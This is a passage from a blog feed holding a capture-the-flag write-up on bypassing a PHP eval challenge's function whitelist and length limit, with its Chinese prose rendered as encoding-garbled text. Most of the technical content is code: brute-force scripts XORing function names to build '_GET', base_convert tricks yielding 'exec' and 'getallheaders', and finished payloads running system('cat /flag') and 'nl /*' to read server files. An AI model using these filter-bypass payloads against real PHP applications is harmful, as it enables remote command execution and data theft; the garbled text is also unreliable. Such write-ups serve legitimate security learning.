å€¼å°çš„<u>ä¸å¯è§å­—ç¬¦</u>ï¼Œä¸å¤Ÿå…¨é¢ã€‚</p><p>å› æ­¤å¯ä»¥åˆ©ç”¨<code>a^b^b=a</code>è¿™ä¸ªæ€§è´¨ï¼Œå°†açœ‹ä½œè¦è·å–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œbä¸ºç™½åå•å‡½æ•°åå¼‚æˆ–ç»„åˆ,é è„šæœ¬çˆ†ç ´å‡ºå¯ä»¥é€šè¿‡è¿›åˆ¶è½¬æ¢è¡¨ç¤ºçš„<code>a^b</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//çˆ†ç ´è„šæœ¬</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$whitelist1</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-variable">$whitelist2</span> = [ <span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-comment">//ä¸whitelist1ç›¸åŒ</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>):<br>   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>):<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>^<span class="hljs-variable">$i</span>^<span class="hljs-string">&quot; /&quot;</span>;<span class="hljs-comment">//a^b</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$k</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-keyword">endforeach</span>;<br><span class="hljs-keyword">endforeach</span>;<br></code></pre></td></tr></table></figure><blockquote><p>è¾“å‡ºç»“æœè¯´æ˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">16</span>   tanh exp <span class="hljs-comment">//æ„æ€æ˜¯&quot; /&quot;^tanh^exp=&quot;16&quot;</span><br><span class="hljs-comment">//å› æ­¤è¦æƒ³å¾—åˆ°&quot; /&quot;åªè¦</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">22</span>)^tanh^exp  <span class="hljs-comment">//å³&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span><br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-number">10</span>)^tanh^exp<span class="hljs-comment">//ä¹Ÿå¯ä»¥</span><br></code></pre></td></tr></table></figure><h4 id="æ³¨æ„âš ï¸"><a href="#æ³¨æ„âš ï¸" class="headerlink" title="æ³¨æ„âš ï¸"></a>æ³¨æ„âš ï¸</h4><ul><li><p>ä¸èƒ½ç›´æ¥<code>16^tanh^exp</code> ï¼Œè¿™æ ·çš„16ä¼šè¢«å½“ä½œintå‹æ•°æ®å¤„ç†ï¼Œä½¿ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°å¯ä»¥è½¬æˆstringç±»å‹ï¼ŒåŒæ—¶é€‰å–çš„æ•°å€¼è½¬æˆ16è¿›åˆ¶ä¸èƒ½æœ‰å­—æ¯ã€‚</p></li><li><p>æ ¹æ®é•¿åº¦ä¸ä¸€è‡´å­—ç¬¦ä¸²å¼‚æˆ–çš„è¿ç®—è§„åˆ™ï¼Œç™½åå•ä¸­æœ€çŸ­çš„æ˜¯piï¼Œå› æ­¤ç‰¹æ®Šå­—ç¬¦ç»„åˆå°½é‡ä¸è¶…è¿‡ä¸¤ä¸ªï¼Œå¦‚æœä¸€å®šè¦æ›´é•¿çš„ç‰¹æ®Šå­—ç¬¦ç»„åˆï¼Œè¦åˆ é™¤ç™½åå•ä¸­è¾ƒçŸ­çš„å‡½æ•°åï¼Œä¸ç„¶å¾—åˆ°çš„ç»“æœéƒ½æ˜¯æˆªæ–­çš„ï¼Œè€Œç‰¹æ®Šå­—ç¬¦ç»„åˆè¶Šé•¿ï¼Œç™½åå•ä¸­å¯ç”¨å‡½æ•°åä¹Ÿå°±è¶Šå°‘ï¼Œå‡ºç°çº¯æ•°å­—ç»“æœçš„å¯èƒ½æ€§ä¹Ÿè¶Šä½ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œä¸èƒ½ç›´æ¥æ„é€ <code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>ä¸€æ—¦å°†ç‰¹æ®Šå­—ç¬¦æ”¹æˆå¤§å†™å­—æ¯æˆ–ä¸ä¸‹åˆ’çº¿çš„ç»„åˆï¼Œè¾“å‡ºä¸­å‡ ä¹æ²¡æœ‰çº¯æ•°å­—ç»“æœã€‚</p><h3 id="å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ"><a href="#å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ" class="headerlink" title="å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ"></a>å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ</h3><p>ä¸Šé¢çš„å¼‚æˆ–ç»“æœå¯ä»¥å½’çº³æˆ<code>ç‰¹æ®Šå­—ç¬¦ç»„åˆ^ç™½åå•å‡½æ•°1^ç™½åå•å‡½æ•°2=çº¯æ•°å­—å­—ç¬¦ä¸²</code>ã€‚</p><p>å› æ­¤å¯ä»¥åˆç†æ¨æµ‹<code>çº¯æ•°å­—å­—ç¬¦ä¸²^ç™½åå•å‡½æ•°1^ç™½åå•å‡½æ•°2=ç‰¹æ®Šå­—ç¬¦ç»„åˆ</code>ã€‚</p><p>çº¯å­—ç¬¦ä¸²å¦‚æœç”¨<code>dechex</code>çš„æ–¹å¼è½¬æ¢ï¼Œéå¸¸æµªè´¹payloadé•¿åº¦ï¼Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ç±»å‹è½¬æ¢çš„ç‰¹æ€§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span>=(<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$i</span>);<span class="hljs-comment">//string(2) &quot;12&quot;</span><br></code></pre></td></tr></table></figure><p>çˆ†ç ´è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<span class="hljs-comment">//$i $jå­—ç¬¦ä¸²æ‹¼æ¥å¾—åˆ°&quot;00&quot;-&quot;99&quot;</span><br>            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç”±äºpiçš„å­˜åœ¨ï¼Œæ„é€ å‡ºæ¥çš„ç»„åˆéƒ½æ˜¯ä¸¤ä¸ªå­—ç¬¦ï¼Œä¼šæƒŠå–œåœ°å‘ç°å¤§å¤šæ•°ä¸ºä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ç»“æœä¸­ tanh^<span class="hljs-number">15</span>==&gt;ET is_nan^<span class="hljs-number">64</span>==&gt;_G <br>å› æ­¤æ„é€  (is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>)) æ­£æ˜¯ <span class="hljs-string">&quot;_G&quot;</span>.<span class="hljs-string">&quot;ET&quot;</span> ï¼Œå³ <span class="hljs-string">&quot;_GET&quot;</span><br></code></pre></td></tr></table></figure><p>å†æ ¹æ®PHPå¯å˜å˜é‡çš„ç‰¹æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//$_GET[1]</span><br></code></pre></td></tr></table></figure><p>{}å¯ä»¥ä»£æ›¿[],è¿™æ ·å°±å¯ä»¥é€šè¿‡getä¼ å‚æ•°ï¼Œç¼©çŸ­payloadé•¿åº¦</p></blockquote><p>$_GET[1]æ¥æ”¶çš„æ•°å€¼ä¼šè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå› æ­¤å³ä½¿æ‹¼æ¥åˆ°äº†ä»£ç ä¸­ä¹Ÿæ— æ³•æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg" alt="1"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg" alt="2"></p><p>å› æ­¤éœ€è¦åƒevalè¿™æ ·çš„å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">42633</span>,<span class="hljs-number">19</span>,<span class="hljs-number">33</span>)(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨phpå¯å˜å‡½æ•°çš„ç‰¹æ€§ï¼š<code>($a)[system]($_GET[1])</code> â€“&gt;phpä¼šå°†<code>$_GET[1]</code>çš„å†…å®¹å½“ä½œå‚æ•°ä¼ å…¥systemå‡½æ•°æ‰§è¡Œã€‚<code>$a</code>åªè¦æ±‚æ˜¯ä¸ªå˜é‡ï¼Œåœ¨è¿™é¢˜çš„èƒŒæ™¯ä¸‹å¯ä»¥ç”¨<code>$pi</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">0</span>&#125;(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="0x02-payloadç¼©çŸ­æŠ€å·§"><a href="#0x02-payloadç¼©çŸ­æŠ€å·§" class="headerlink" title="0x02 payloadç¼©çŸ­æŠ€å·§"></a>0x02 payloadç¼©çŸ­æŠ€å·§</h2><h3 id="é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°"><a href="#é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°" class="headerlink" title="é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°"></a>é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°</h3><ul><li><p>ä½¿ç”¨$_GET[1]ï¼Œç´¢å¼•é€‰æ‹©æœ€ç®€çŸ­ä¸”ç¬¦åˆé¢˜ç›®è¦æ±‚çš„æ•°å­—1ï¼Œç³»ç»Ÿå‘½ä»¤é€šè¿‡1ä¼ å‚ï¼Œä¸å æœ‰payload</p></li><li><p>ä½¿ç”¨getallheadersè·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå°†ç´¢å¼•è®¾æˆ1ï¼Œå°†è·å–headerä¸­keyä¸º1çš„valueï¼Œå†å°†è¿™ä¸ªç»“æœä¼ å…¥execå‡½æ•°ï¼Œä½†è¿™ä¸ªpayloadè¾ƒé•¿ï¼Œè¶…è¿‡60å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//base_convert(696468,10,36) -&gt; exec</span><br><span class="hljs-comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="hljs-comment">//exec(getallheaders()&#123;1&#125;)</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="ç©·ä¸¾è¿›åˆ¶è½¬æ¢"><a href="#ç©·ä¸¾è¿›åˆ¶è½¬æ¢" class="headerlink" title="ç©·ä¸¾è¿›åˆ¶è½¬æ¢"></a>ç©·ä¸¾è¿›åˆ¶è½¬æ¢</h3><p>å¦‚æœè¦å¾—åˆ°flagå­—ç¬¦ä¸²ï¼Œ10è¿›åˆ¶è½¬36è¿›åˆ¶éœ€è¦æ•°å­—ä¸º727432,æœ‰6ä½ï¼Œè€Œé€šè¿‡è„šæœ¬ç©·ä¸¾+æ­£åˆ™åŒ¹é…ç­›é€‰å¯ä»¥å‘ç°32è¿›åˆ¶è½¬22è¿›åˆ¶æ—¶ï¼Œåªéœ€è¦4ä½æ•°å­—å°±å¯ä»¥å¾—åˆ°flag</p><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$tmp</span>)-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-variable">$num</span>)<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">11</span>+<span class="hljs-variable">$num</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">10</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$res</span>.= <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>*<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;&#125;\n/&#x27;</span>,<span class="hljs-variable">$res</span>,<span class="hljs-variable">$mc</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg" alt="image-20220809211543165"></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-ä¸€äº›å°è¯•"><a href="#0x03-ä¸€äº›å°è¯•" class="headerlink" title="0x03 ä¸€äº›å°è¯•"></a>0x03 ä¸€äº›å°è¯•</h2><h3 id="èŠ±æ‹¬å·"><a href="#èŠ±æ‹¬å·" class="headerlink" title="èŠ±æ‹¬å·"></a>èŠ±æ‹¬å·</h3><p>ä¸Šé¢çš„payloadå‡ ä¹éƒ½ä½¿ç”¨äº†èŠ±æ‹¬å·æ¥è®¿é—®æ•°ç»„ï¼Œå¦‚æœé¢˜ç›®è¿‡æ»¤äº†èŠ±æ‹¬å·ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥åœ¨ä¿è¯é•¿åº¦å°½å¯èƒ½å°çš„æƒ…å†µä¸‹,æ„é€ æ— èŠ±æ‹¬å·payload</p><blockquote><p>PHP7.4ä¸å†èƒ½å¤Ÿä½¿ç”¨èŠ±æ‹¬å·æ¥è®¿é—®<a href="https://www.yuanmaluntan.com/tags-11630.html">æ•°ç»„</a>æˆ–è€…å­—ç¬¦ä¸²çš„åç§».éœ€è¦å°†{}ä¿®æ”¹æˆ[] ï¼ˆæœ¬é¢˜ç¯å¢ƒä¸º7.3.9ï¼‰</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg" alt="4"></p><h3 id="æ— èŠ±æ‹¬å·payload"><a href="#æ— èŠ±æ‹¬å·payload" class="headerlink" title="æ— èŠ±æ‹¬å·payload"></a>æ— èŠ±æ‹¬å·payload</h3><p>ç”±äºä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²ï¼Œåå¼•å·ä¸èƒ½è¢«è¯†åˆ«ä¸ºç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œå› æ­¤ä½¿ç”¨åç§°è¾ƒçŸ­çš„execå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·å°±ä¸èƒ½å¤–éƒ¨ä¼ å…¥å‘½ä»¤æ¥èŠ‚çœpayloadï¼Œå› æ­¤è¦æ±‚æ‰§è¡Œçš„å‘½ä»¤è¶³å¤ŸçŸ­ï¼Œè¿™é‡Œä½¿ç”¨nlå‘½ä»¤</p><p>linuxä¸‹æ‰§è¡Œ<code>nl /*</code>æ‰«ææ ¹ç›®å½•ï¼Œä¼šæ‰“å°æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œä¸ä¼šç›®å½•å‘ä¸‹é€’å½’</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg" alt="6"></p><blockquote><p><code>nl [å‚æ•°] [æ–‡ä»¶]</code></p><p>nlå‘½ä»¤æ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ç¼–å·è¿‡æ»¤å·¥å…·ã€‚è¯¥å‘½ä»¤å¯ä»¥è¯»å– File å‚æ•°ï¼ˆç¼ºçœæƒ…å†µä¸‹æ ‡å‡†è¾“å…¥ï¼‰ï¼Œè®¡ç®—è¾“å…¥ä¸­çš„è¡Œå·ï¼Œå°†è®¡ç®—è¿‡çš„è¡Œå·å†™å…¥æ ‡å‡†è¾“å‡ºã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">aff   rad2deg sin <span class="hljs-comment">//`nl</span><br><span class="hljs-number">16</span>   exp tan   <span class="hljs-comment">// /</span><br><span class="hljs-number">9</span>f   cos pi  <span class="hljs-comment">//*`</span><br>  <br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">2815</span>)^rad2deg^sin).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>)^exp^tan).(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">159</span>)^cos^pi) <span class="hljs-comment">//`nl /*`</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca   abs log <span class="hljs-comment">//nl</span><br><span class="hljs-number">164</span>   exp tan <span class="hljs-comment">// /*</span><br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).(<span class="hljs-title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="hljs-comment">//nl /*</span><br></code></pre></td></tr></table></figure><p>ç”¨ä¸Šé¢çš„ç©·ä¸¾è„šæœ¬æ‰¾å‡ºæœ€é€‚åˆçš„è¿›åˆ¶è½¬æ¢exec</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;34 23 22950&quot;</span>&#125;<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>) <span class="hljs-comment">//exec</span><br></code></pre></td></tr></table></figure><p>æ— èŠ±æ‹¬å·payload</p><p>é•¿åº¦:70</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)((<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)^exp^tan))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg" alt="7"></p><p>æœ¬åœ°php7.4ä»¥ä¸Šä¹Ÿèƒ½æˆåŠŸæ‰§è¡Œ(ä½†æ˜¯php8ä»¥åæœ‰ä¸ªfatal error ä¸èƒ½ä½¿ç”¨æœªå®šä¹‰å¸¸é‡ï¼Œç›´æ¥ç”¨å‡½æ•°åå¼‚æˆ–çš„æ—¶å€™ä¼šè¯†åˆ«æˆå¸¸é‡)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg" alt="9"></p><p>ä¸è¿‡è¿™è¾¹å°è¯•äº†ä¸‹å¸¦èŠ±æ‹¬å·çš„ï¼Œä¼¼ä¹ä¹Ÿèƒ½æˆåŠŸï¼ŒèŠ±æ‹¬å·åªåœ¨php8ä»¥åæ‰è¢«å®šä¹‰ä¸º<strong>Fatal error</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg" alt="11"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå­¦ä¹ </title>
      <link href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/12/docker%E5%AD%A6%E4%B9%A0/</url>
      
